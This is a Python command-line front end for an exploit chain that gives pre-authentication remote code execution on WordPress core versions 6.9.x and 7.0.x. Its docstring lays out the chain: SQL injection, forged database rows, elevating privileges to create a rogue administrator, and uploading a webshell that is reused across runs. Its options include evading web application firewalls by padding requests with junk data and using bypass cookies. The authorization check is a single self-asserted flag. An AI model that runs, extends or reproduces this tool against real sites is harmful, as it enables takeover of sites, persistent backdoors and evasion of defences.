"""
wp2shell_rce.py — pre-auth RCE exploitation
=============================================
CVE-2026-63030 (REST /batch/v1 route confusion) + CVE-2026-60137
(WP_Query::author__not_in SQL injection) in WordPress core 6.9.0-6.9.4 / 7.0.0-7.0.1.

Full pre-auth RCE on stock WordPress — no FILE privilege, no object cache, no
plugins, no misconfigurations required. The chain:
  1. Blind/UNION SQLi confirms vulnerability and extracts table prefix / admin ID
  2. UNION row forgery via per_page=-1 split_the_query bypass injects fake posts
  3. oEmbed cache seeding turns read-only SQLi into real DB writes
  4. Changeset elevation + re-entrant parse_request runs in admin context
  5. POST /wp/v2/users creates a new administrator
  6. Login → plugin webshell upload → command execution (reused across runs)

The created admin and deployed webshell are cached per target (~/.wp2shell/state.json),
so repeat `-c` runs skip the whole chain and issue a single request to the live shell.
--fresh forces the full chain; --cleanup makes the shell delete itself and clears the cache.

The stock-default RCE mechanism (oEmbed → changeset → re-entry) was researched by
Mustafa Can İPEKÇİ (nukedx), building on the route confusion + SQLi discovered by
Adam Kues (Assetnote / Searchlight Cyber).

Use wp2shell_check.py to only detect the vulnerability (read-only, no changes).

Authorized use only
-------------------
Run this against systems you own or are explicitly authorized to test. Remote
(non-loopback) targets require --authorized.

Usage
-----
    python3 wp2shell_rce.py http://target -c "id"            # full pre-auth RCE (caches admin+shell)
    python3 wp2shell_rce.py http://target -c "whoami"        # reuses the cached shell (single request)
    python3 wp2shell_rce.py http://target -c "id" --multipart  # RCE batch over rest_route forms
    python3 wp2shell_rce.py http://target -c "whoami" --fresh   # new admin + new plugin
    python3 wp2shell_rce.py http://target --cleanup          # remove the deployed shell + forget state
"""
import argparse
import sys
import urllib.error

from wp2shell_core import Target, is_local, __version__


def main():
    p = argparse.ArgumentParser(
        description="wp2shell_rce (CVE-2026-63030/60137) pre-auth RCE.")
    p.add_argument("url", nargs="?", help="target base URL, e.g. http://host:8093")
    p.add_argument("-c", "--command", metavar="CMD",
                   help="OS command to execute via pre-auth RCE (requires --authorized for remote)")
    p.add_argument("--route", choices=("auto", "rest-route", "wp-json"), default="auto")
    p.add_argument("--method", choices=("auto", "boolean", "time", "union"), default="auto",
                   help="extraction/oracle method used to confirm the SQLi before exploiting. "
                        "auto (default) prefers UNION reflection, falling back to the blind "
                        "boolean/time oracle.")
    p.add_argument("--delivery", choices=("auto", "json", "multipart"), default="auto",
                   help="batch delivery for the RCE forge/extraction requests. auto defaults "
                        "to JSON; multipart rides the batch as a rest_route form on POST /.")
    p.add_argument("--multipart", action="store_true",
                   help="alias for --delivery multipart (the exact operator request shape)")
    p.add_argument("--slot", choices=("auto", "users", "posts-item"), default="auto")
    p.add_argument("--fresh", action="store_true",
                   help="start over: remove any previously deployed shell, then run the full "
                        "chain with a brand-new administrator and a brand-new plugin")
    p.add_argument("--cleanup", action="store_true",
                   help="tell the cached webshell to delete itself and forget the saved state")
    p.add_argument("--sleep", type=float, default=4.0, help="injected SLEEP seconds (default 4)")
    p.add_argument("--rounds", type=int, default=3, help="median over N probes (default 3)")
    p.add_argument("--timeout", type=float, default=30.0)
    p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 (Burp)")
    p.add_argument("--cookies", default="",
                   help="cookies string sent on every request via http.client "
                        "(e.g. 'cf_clearance=...; __cf_bm=...; pll_language=en'). "
                        "When set (or with --bypass), requests use http.client "
                        "with junk-padded bodies (request pumping technique).")
    p.add_argument("--bypass", action="store_true",
                   help="Enable request pumping: route all requests through http.client "
                        "and wrap the batch in a ~2MB junk-padded body so a WAF never "
                        "inspects the real requests array. Combine with --multipart for "
                        "junk-padded multipart bodies, or --cookies for CF clearance.")
    p.add_argument("-H", "--header", action="append", default=[], metavar="'Name: Value'",
                   help="extra header added to every request (repeatable)")
    p.add_argument("--authorized", action="store_true",
                   help="assert authorization for remote targets")
    args = p.parse_args()

    if args.fresh and args.cleanup:
        p.error("--fresh and --cleanup are mutually exclusive")
    if args.multipart:
        args.delivery = "multipart"
    if not args.command and not args.cleanup:
        p.error("provide -c/--command or --cleanup")
    if not args.url:
        p.error("-c/--command and --cleanup require a target URL")

    hdrs = []
    for h in args.header:
        if ":" not in h:
            p.error("bad header %r (expected 'Name: Value')" % h)
        name, value = h.split(":", 1)
        hdrs.append((name.strip(), value.strip()))

    url = args.url if "://" in args.url else "http://" + args.url
    if not is_local(url) and not args.authorized:
        p.error("-c/--command and --cleanup on remote targets require --authorized")

    # Honor the selected delivery for the RCE forge/extraction too, so with
    # --multipart the batch requests ride as rest_route forms (not JSON). auto has
    # no resolver on this path, so it defaults to JSON.
    delivery = "json" if args.delivery == "auto" else args.delivery
    t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
               sleep=args.sleep, route=args.route, delivery=delivery, slot=args.slot,
               headers=hdrs, cookies=args.cookies, bypass=args.bypass)

    if args.cleanup:
        try:
            _, _, output = t.exploit(args.command, cleanup=True)
        except (RuntimeError, urllib.error.URLError) as e:
            print("[-] cleanup failed: %s" % e); return 2
        print("[+] %s" % output); return 0

    # Reuse fast-path: a cached webshell for this target means we can skip the
    # detection round-trip entirely and go straight to a single reuse request.
    # Normalize first so the state key matches the one exploit() saves under
    # (post http->https / apex->www redirect).
    t._normalize_base()
    cached = (not args.fresh) and bool(t._load_state().get("route"))
    if not cached:
        # auto/union: prefer UNION reflection (real data, one request); fall back to
        # the blind timing oracle when reflection is blocked (unless union is forced).
        if args.method in ("auto", "union") and t._union_confirms():
            print("[+] vulnerable (UNION reflection confirmed)")
        elif args.method == "union":
            print("[-] union reflection failed (not vulnerable or blocked)"); return 1
        else:
            try:
                det = t.detect(rounds=args.rounds)
            except urllib.error.URLError as e:
                print("[-] %s" % e.reason); return 2
            if not det["vulnerable"]:
                print("[-] not vulnerable"); return 1
            print("[+] vulnerable (blind SQLi: %.3fs / %.3fs)" % (det["fast"], det["slow"]))
    try:
        user, pw, output = t.exploit(args.command, fresh=args.fresh)
    except (RuntimeError, urllib.error.URLError) as e:
        print("[-] exploit failed: %s" % e); return 2
    print("[+] RCE output:\n")
    print(output, end="")
    return 0


if __name__ == "__main__":
    sys.exit(main())
